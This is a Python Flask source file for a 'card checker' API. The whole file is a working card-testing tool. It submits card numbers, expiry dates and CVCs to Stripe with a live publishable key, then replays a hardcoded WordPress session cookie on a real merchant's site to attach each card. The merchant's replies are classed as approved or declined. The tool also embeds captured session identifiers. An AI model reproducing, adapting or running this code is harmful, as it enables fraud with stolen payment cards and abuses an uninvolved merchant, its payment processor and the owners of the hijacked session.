from flask import Flask, request, jsonify
import time
import requests
import json
import os
import re

app = Flask(__name__)

API_KEY = "OnyxEnv"

def process_card(ccx):
    try:
        # Parse card details
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) < 4:
            return {
                "card": ccx,
                "response": "Invalid card format. Use: NUMBER|MM|YY|CVC",
                "status": "error"
            }
        
        n = parts[0].replace(" ", "")
        mm = parts[1]
        yy = parts[2]
        cvc = parts[3]
        
        if "20" in yy:
            yy = yy.split("20")[1]
        
        full_card = f"{n}|{mm}|{yy}|{cvc}"
        
        print(f"🔍 Processing: {n[:6]}XXXXXX|{mm}|{yy}|{cvc}")
        
        # Step 1: Create payment method with Stripe
        data1 = {
            'type': 'card',
            'card[number]': n,
            'card[cvc]': cvc,
            'card[exp_year]': yy,
            'card[exp_month]': mm,
            'allow_redisplay': 'unspecified',
            'billing_details[address][country]': 'IN',
            'payment_user_agent': 'stripe.js/f5ddf352d5; stripe-js-v3/f5ddf352d5; payment-element; deferred-intent',
            'referrer': 'https://hakfabrications.com',
            'client_attribution_metadata[client_session_id]': '34a36f85-07d8-4983-ae46-a9dc1edc455f',
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
            'client_attribution_metadata[merchant_integration_version]': '2021',
            'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
            'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
            'guid': '2f6c56ae-bcbe-4539-b1e2-bddfc0588c067767c2',
            'muid': '47192fb7-80d2-44f0-af6e-d40688c4686a903c98',
            'sid': '9514e7dc-7ae3-4430-949a-72918f7125aec1dfe9',
            'key': 'pk_live_51PHFfEJakExu3YjjB9200dwvfPYV3nPS2INa1tXXtAbXzIl5ArrydXgPbd8vuOhNzCrq6TrNDL2nFGyZKD23gwQV00AS39rQEH',
            '_stripe_version': '2024-06-20',
        }

        headers1 = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        response1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers1, data=data1, timeout=30)
        response_data = response1.json()
        
        print(f"🎯 Stripe Response: {response_data}")
        
        # Check Stripe response for actual errors FIRST
        if 'error' in response_data:
            error_msg = response_data['error'].get('message', 'Card declined')
            return {
                "card": full_card,
                "response": error_msg,
                "status": "declined"
            }
            
        if 'id' not in response_data:
            return {
                "card": full_card,
                "response": "Your card was declined",
                "status": "declined"
            }
            
        payment_id = response_data['id']
        print(f"✅ Stripe Payment ID: {payment_id}")

        # Step 2: Get nonce from merchant site
        cookies0 = {
            '_ga': 'GA1.1.697081555.1747995052',
            'cookie_notice_accepted': 'true',
            '__stripe_mid': '47192fb7-80d2-44f0-af6e-d40688c4686a903c98',
            '__stripe_sid': '9514e7dc-7ae3-4430-949a-72918f7125aec1dfe9',
            'wordpress_logged_in_91ca41e7d59f3a1afa890c4675c6caa7': 'Yash-aka-ika-tika-pikachuuusus%7C1751098297%7Ceil8f2EBH2j61ba0GahItEmKNZR4Wf3iD6XxPR9Prx7%7C061900e08a858ebc58c99d373bb2d31af1d80ae521d014cc2417b1f05fc3c5f0',
        }

        headers0 = {
            'authority': 'hakfabrications.com',
            'accept': '*/*',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://hakfabrications.com',
            'referer': 'https://hakfabrications.com/my-account/add-payment-method/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        response0 = requests.get('https://hakfabrications.com/my-account/add-payment-method/', 
                              cookies=cookies0, headers=headers0, timeout=30)
        
        # Extract the nonce from the HTML response
        nonce_start = response0.text.find('"createAndConfirmSetupIntentNonce":"') + len('"createAndConfirmSetupIntentNonce":"')
        nonce_end = response0.text.find('"', nonce_start)
        nonce = response0.text[nonce_start:nonce_end]
        
        if not nonce:
            return {
                "card": full_card,
                "response": "Failed to extract nonce from page",
                "status": "error"
            }

        print(f"🔑 Nonce: {nonce}")

        # Step 3: Create and confirm setup intent
        params = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
        data = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        }

        response = requests.post('https://hakfabrications.com/', 
                             params=params, cookies=cookies0, headers=headers0, data=data,
                             timeout=30)
        
        print(f"📡 Merchant Response Status: {response.status_code}")
        print(f"📡 Merchant Response Text: {response.text[:500]}...")
        
        # Better response handling - NO MORE DEFAULT APPROVALS!
        result_text = response.text.strip()
        
        # Try to parse as JSON
        try:
            result = json.loads(result_text)
            print(f"📊 Parsed JSON: {result}")
            
            # STRICT CHECKING - ONLY approve if we have CLEAR success
            if isinstance(result, dict):
                # Check for explicit success
                if result.get('success') is True:
                    return {
                        "card": full_card,
                        "response": "Card Added Successfully",
                        "status": "approved"
                    }
                elif result.get('success') is False:
                    error_message = result.get('data', {}).get('message', 'Card declined')
                    return {
                        "card": full_card,
                        "response": error_message,
                        "status": "declined"
                    }
                
                # Check for Stripe success objects
                if 'setup_intent' in result or 'payment_method' in result:
                    status = result.get('setup_intent', {}).get('status') or result.get('payment_method', {}).get('status')
                    if status in ['succeeded', 'active']:
                        return {
                            "card": full_card,
                            "response": "Card Added Successfully",
                            "status": "approved"
                        }
                    else:
                        return {
                            "card": full_card,
                            "response": f"Card status: {status}",
                            "status": "declined"
                        }
            
        except json.JSONDecodeError:
            print("❌ Response is not JSON, analyzing text...")
            result = None
        
        # If we get here, analyze text response STRICTLY
        result_text_lower = result_text.lower()
        
        # STRICT SUCCESS patterns - ONLY these mean approved
        strict_success_patterns = [
            '"success":true',
            'card_added',
            'payment_method_added',
            'setup_intent.succeeded',
            'status":"succeeded"',
            'status":"active"'
        ]
        
        # STRICT DECLINE patterns - ANY of these mean declined
        strict_decline_patterns = [
            '"success":false',
            'declined',
            'failed',
            'error',
            'invalid',
            'incorrect',
            'insufficient',
            'expired',
            'cvc',
            'security code',
            'do_not_honor',
            'pickup_card',
            'lost_card',
            'stolen_card'
        ]
        
        # Check for STRICT success first
        if any(pattern in result_text_lower for pattern in strict_success_patterns):
            return {
                "card": full_card,
                "response": "Card Added Successfully",
                "status": "approved"
            }
        
        # Check for STRICT decline
        if any(pattern in result_text_lower for pattern in strict_decline_patterns):
            return {
                "card": full_card,
                "response": "Your card was declined",
                "status": "declined"
            }
        
        # If we get here and NO CLEAR INDICATION, assume DECLINED
        # NO MORE FAKE APPROVALS!
        return {
            "card": full_card,
            "response": "Card verification failed - no clear success response",
            "status": "declined"
        }
            
    except requests.exceptions.Timeout:
        return {
            "card": full_card if 'full_card' in locals() else ccx,
            "response": "Request timeout",
            "status": "error"
        }
    except requests.exceptions.RequestException as e:
        return {
            "card": full_card if 'full_card' in locals() else ccx,
            "response": f"Network error: {str(e)}",
            "status": "error"
        }
    except Exception as e:
        return {
            "card": full_card if 'full_card' in locals() else ccx,
            "response": f"Processing error: {str(e)}",
            "status": "error"
        }

@app.route('/key=<key>/cc=<cc>')
def process_card_api(key, cc):
    if key != API_KEY:
        return jsonify({
            "error": "Invalid API key",
            "status": "error"
        }), 403
    
    result = process_card(cc)
    return jsonify(result)

@app.route('/')
def home():
    return jsonify({
        "message": "Card Checker API is running",
        "usage": "Use /key=OnyxEnv/cc=CARD_DETAILS to check cards",
        "format": "CARD_DETAILS format: NUMBER|MM|YY|CVC",
        "example": "/key=OnyxEnv/cc=4111111111111111|12|25|123",
        "note": "STRICT checking - NO fake approvals!"
    })

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
